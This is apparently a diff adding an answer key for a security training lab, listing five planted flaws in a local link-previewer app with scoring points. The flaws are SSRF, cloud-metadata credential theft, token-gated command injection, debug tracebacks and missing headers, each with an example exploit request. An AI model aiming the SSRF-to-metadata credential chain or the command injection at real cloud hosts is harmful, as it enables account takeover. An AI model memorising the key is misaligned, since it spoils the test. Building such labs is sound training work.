@@ -1,0 +1,52 @@
+{
+  "lab": "12-cloudpivot",
+  "base_url": "http://127.0.0.1:18812",
+  "stack": "python-stdlib cloud-hosted link previewer",
+  "vulns": [
+    {
+      "id": "K1",
+      "class": "ssrf",
+      "severity": "high",
+      "route": "/fetch",
+      "desc": "Server-Side Request Forgery: GET /fetch?url= (and /preview?url=) fetches an arbitrary URL server-side. The blocklist only blocks literal 127.0.0.1/localhost, so cloud-internal hosts (169.254.169.254, instance-data) and alternate encodings slip through. This is the ENTRY of the chain.",
+      "exploit": "GET /fetch?url=http://example.com -> server-side request issued. GET /fetch?url=http://169.254.169.254/latest/meta-data/ -> reaches cloud metadata (see K2).",
+      "points": 1
+    },
+    {
+      "id": "K2",
+      "class": "creds",
+      "severity": "critical",
+      "route": "*",
+      "desc": "Cloud instance-role credential disclosure via the SSRF (chain step 2): pivoting the SSRF to the IMDS endpoint http://169.254.169.254/latest/meta-data/iam/security-credentials/<role> returns live AccessKeyId / SecretAccessKey / session Token. Only reachable by exploiting K1 — IMDS is not directly reachable by the attacker.",
+      "exploit": "GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/cloudpivot-app-role -> JSON with AccessKeyId/SecretAccessKey/Token.",
+      "points": 1
+    },
+    {
+      "id": "K3",
+      "class": "rce",
+      "severity": "critical",
+      "route": "/internal/admin",
+      "desc": "OS command injection -> RCE (chain step 3): /internal/admin?cmd= executes a maintenance command but is gated by a valid instance credential — it trusts the IMDS session Token leaked in K2 as a Bearer. Only reachable after chaining K1->K2 to obtain the Token. (Lab-safe: only a read-only canary actually runs.)",
+      "exploit": "GET /internal/admin?cmd=whoami with Authorization: Bearer <Token-from-K2> -> command output (RCE). Non-canary commands are confirmed injectable but intercepted.",
+      "points": 1
+    },
+    {
+      "id": "K4",
+      "class": "info-disc",
+      "severity": "medium",
+      "route": "*",
+      "desc": "Security misconfiguration (app-wide): debug mode on -> malformed input returns a full Python traceback in the response body, leaking source paths and internals.",
+      "exploit": "GET /fetch?url=http://a:notaport/ -> ValueError stack trace (full traceback) in the response.",
+      "points": 1
+    },
+    {
+      "id": "K5",
+      "class": "headers",
+      "severity": "low",
+      "route": "*",
+      "desc": "Missing security headers on all responses: no Content-Security-Policy, X-Frame-Options/frame-ancestors, X-Content-Type-Options, or HSTS.",
+      "exploit": "curl -I any endpoint -> none of CSP/XFO/XCTO/HSTS present.",
+      "points": 1
+    }
+  ]
+}
